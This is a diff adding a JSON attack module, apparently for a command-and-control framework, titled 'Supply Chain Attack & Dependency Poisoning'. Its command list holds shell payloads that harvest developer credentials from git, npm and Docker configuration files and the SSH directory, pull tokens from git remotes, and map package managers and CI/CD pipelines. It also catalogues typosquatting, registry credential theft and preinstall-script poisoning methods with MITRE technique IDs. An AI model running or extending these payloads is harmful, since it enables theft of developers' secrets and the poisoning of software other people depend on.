@@ -1,0 +1,83 @@
+{
+  "id": "supply_chain_poisoning",
+  "name": "Supply Chain Attack & Dependency Poisoning",
+  "description": "Modern software supply chain exploitation including dependency confusion, package manager poisoning, CI/CD pipeline injection, and developer tool compromise",
+  "version": "2.0",
+  "author": "SecureComm C2 - SupplyChainSec",
+  "category": "supply-chain",
+  "platform": "cross-platform",
+  "risk_level": "critical",
+  "requires_admin": false,
+  "commands": [
+    {
+      "type": "exec",
+      "payload": "find /home -name 'package.json' -o -name 'requirements.txt' -o -name 'Cargo.toml' -o -name 'go.mod' -o -name 'pom.xml' -o -name 'Gemfile' 2>/dev/null | head -30; cat package.json 2>/dev/null | jq -r '.dependencies | keys[]' 2>/dev/null | head -20",
+      "description": "Dependency manifest discovery across multiple ecosystems",
+      "timeout": 60,
+      "supply_chain_technique": "manifest_discovery"
+    },
+    {
+      "type": "exec",
+      "payload": "pip list 2>/dev/null | head -30; npm list -g --depth=0 2>/dev/null | head -20; gem list 2>/dev/null | head -20; go list -m all 2>/dev/null | head -20; ls -la ~/.m2/repository/ 2>/dev/null | head -10",
+      "description": "Installed package enumeration for all major package managers",
+      "timeout": 45,
+      "supply_chain_technique": "package_enumeration"
+    },
+    {
+      "type": "exec",
+      "payload": "cat ~/.gitconfig 2>/dev/null | grep -E 'user|token|password'; cat ~/.docker/config.json 2>/dev/null | jq -r '.auths | keys[]' 2>/dev/null; ls -la ~/.ssh/ 2>/dev/null; cat ~/.npmrc 2>/dev/null | grep -E '_auth|registry'",
+      "description": "Developer credential and registry configuration extraction",
+      "timeout": 30,
+      "supply_chain_technique": "credential_extraction"
+    },
+    {
+      "type": "exec",
+      "payload": "find / -name '.github' -type d 2>/dev/null | head -10; cat .github/workflows/*.yml 2>/dev/null | head -100 || echo 'No GitHub Actions'; find / -name '.gitlab-ci.yml' 2>/dev/null | head -5",
+      "description": "CI/CD pipeline configuration discovery",
+      "timeout": 90,
+      "supply_chain_technique": "cicd_discovery"
+    },
+    {
+      "type": "exec",
+      "payload": "ls -la node_modules/ 2>/dev/null | wc -l; find node_modules -name '*.js' -exec grep -l 'eval|child_process|https' {} \\; 2>/dev/null | head -10; pip show requests 2>/dev/null | grep -E 'Location|Version'",
+      "description": "Dependency tree analysis and suspicious package detection",
+      "timeout": 120,
+      "supply_chain_technique": "dependency_analysis"
+    },
+    {
+      "type": "exec",
+      "payload": "git log --oneline -20 2>/dev/null; git remote -v 2>/dev/null; cat .git/config 2>/dev/null | grep -E 'url|token'; ls -la .git/hooks/ 2>/dev/null",
+      "description": "Git repository metadata and hook inspection",
+      "timeout": 45,
+      "supply_chain_technique": "git_exploitation"
+    }
+  ],
+  "target_ecosystems": [
+    "npm/nodejs",
+    "pypi/python",
+    "maven/java",
+    "cargo/rust",
+    "go/modules",
+    "rubygems",
+    "nuget/dotnet"
+  ],
+  "attack_vectors": [
+    "dependency_confusion",
+    "typosquatting_attack",
+    "malicious_package_injection",
+    "ci_cd_pipeline_poisoning",
+    "git_hook_manipulation",
+    "registry_credential_theft"
+  ],
+  "poisoning_methods": {
+    "npm": "preinstall script execution",
+    "pip": "setup.py arbitrary code",
+    "maven": "malicious dependency substitution",
+    "go": "module proxy poisoning"
+  },
+  "mitre_techniques": ["T1195", "T1195.001", "T1195.002", "T1554", "T1555"],
+  "tags": ["supply-chain", "dependency", "ci-cd", "poisoning", "software", "2026"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z",
+  "demonstration_notes": "State-of-the-art supply chain attack vectors targeting modern software development workflows"
+}
